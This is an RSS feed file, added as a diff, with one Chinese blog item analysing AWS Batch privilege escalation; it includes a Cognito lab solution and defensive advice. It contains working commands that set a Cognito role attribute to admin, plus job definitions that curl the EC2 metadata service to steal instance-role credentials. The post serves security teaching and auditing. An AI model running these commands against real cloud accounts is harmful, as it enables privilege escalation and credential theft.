@@ -1,0 +1,123 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>云计算安全 on 办公AI智能小助手</title>
+        <link>http://localhost:1313/tags/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8/</link>
+        <description>Recent content in 云计算安全 on 办公AI智能小助手</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>qife</copyright>
+        <lastBuildDate>Sun, 03 Aug 2025 01:56:38 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>探索AWS Batch权限提升漏洞的技术分析</title>
+        <link>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 01:56:38 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;从上一期说起您解决cloudsectidbit第2期的iac实验了吗&#34;&gt;从上一期说起&amp;hellip;您解决CloudSecTidbit第2期的IaC实验了吗？
+&lt;/h3&gt;&lt;p&gt;[解决方案]
+AWS Cognito挑战的核心是通过权限提升获取管理员权限并读取内部用户列表。应用程序使用AWS Cognito颁发的会话令牌（保存为名为&lt;code&gt;aws-cognito-app-access-token&lt;/code&gt;的cookie），攻击者可以通过以下步骤实现提权：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws cognito-idp get-user --region us-east-1 --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws --region us-east-1 cognito-idp update-user-attributes --user-attributes &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name=custom:Role,Value=admin&amp;#34;&lt;/span&gt; --access-token &amp;lt;USER_ACCESS_TOKEN&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;漏洞根源在于平台过度信任&lt;code&gt;custom:Role&lt;/code&gt;属性进行授权判断。&lt;/p&gt;
+&lt;h3 id=&#34;技术聚焦aws-batch权限提升研究&#34;&gt;技术聚焦：AWS Batch权限提升研究
+&lt;/h3&gt;&lt;h4 id=&#34;aws-batch基础架构&#34;&gt;AWS Batch基础架构
+&lt;/h4&gt;&lt;p&gt;AWS Batch是AWS提供的批处理计算服务，主要组件包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Jobs&lt;/strong&gt;：工作单元（脚本/可执行文件/容器镜像）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Job definitions&lt;/strong&gt;：任务蓝图（含IAM角色、资源需求等配置）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Job Queues&lt;/strong&gt;：任务调度队列&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Compute environments&lt;/strong&gt;：计算资源环境（支持Fargate/EC2/EKS三种编排类型）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;漏洞场景分析&#34;&gt;漏洞场景分析
+&lt;/h4&gt;&lt;p&gt;在多租户平台中发现高危配置：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;所有租户任务均使用EC2编排类型运行&lt;/li&gt;
+&lt;li&gt;计算环境EC2实例需要高权限角色管理EFS等资源&lt;/li&gt;
+&lt;li&gt;任务容器具有&lt;code&gt;batch:RegisterJobDefinition&lt;/code&gt;和&lt;code&gt;batch:SubmitJob&lt;/code&gt;权限&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;攻击链分解&#34;&gt;攻击链分解
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;初始访问&lt;/strong&gt;：通过容器元数据服务（CMDS@169.254.170.2）获取任务执行角色凭证&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限滥用&lt;/strong&gt;：利用获得的凭证创建恶意任务定义&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络配置突破&lt;/strong&gt;：由于EC2环境默认使用主机网络模式，容器可访问实例元数据服务（IMDSv2）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;凭证窃取&lt;/strong&gt;：通过IMDS获取EC2实例的高权限角色凭证&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;技术验证过程&#34;&gt;技术验证过程
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;步骤1 - 获取实例角色名&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-rolename &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/&amp;#34;]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;步骤2 - 获取角色凭证&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws batch register-job-definition &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --job-definition-name poc-get-aimcreds &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --type container &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --container-properties &lt;span class=&#34;s1&#34;&gt;&amp;#39;{
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;image&amp;#34;: &amp;#34;curlimages/curl&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;command&amp;#34;: [&amp;#34;sh&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME&amp;#34;]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;  }&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;安全建议&#34;&gt;安全建议
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;审计人员检查清单&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;确认任务执行上下文是否限制IMDS访问&lt;/li&gt;
+&lt;li&gt;审查EC2编排环境中的实例角色权限&lt;/li&gt;
+&lt;li&gt;检查是否过度分配&lt;code&gt;RegisterJobDefinition/SubmitJob&lt;/code&gt;权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;开发者防护措施&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;网络层限制IMDS访问（通过&lt;code&gt;aws ec2 modify-instance-metadata-options&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;遵循最小权限原则配置任务角色&lt;/li&gt;
+&lt;li&gt;考虑使用Fargate替代EC2编排类型&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;实践资源&#34;&gt;实践资源
+&lt;/h3&gt;&lt;p&gt;漏洞复现环境已开源：&lt;a class=&#34;link&#34; href=&#34;https://github.com/doyensec/cloudsec-tidbits/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CloudSecTidbits实验室&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&#34;延伸阅读&#34;&gt;延伸阅读
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://docs.aws.amazon.com/batch/latest/userguide/what-is-batch.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;AWS Batch官方文档&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.doyensec.com/2023/03/13/aws-metadata-service-container-security.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;容器工作负载中的元数据服务安全&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
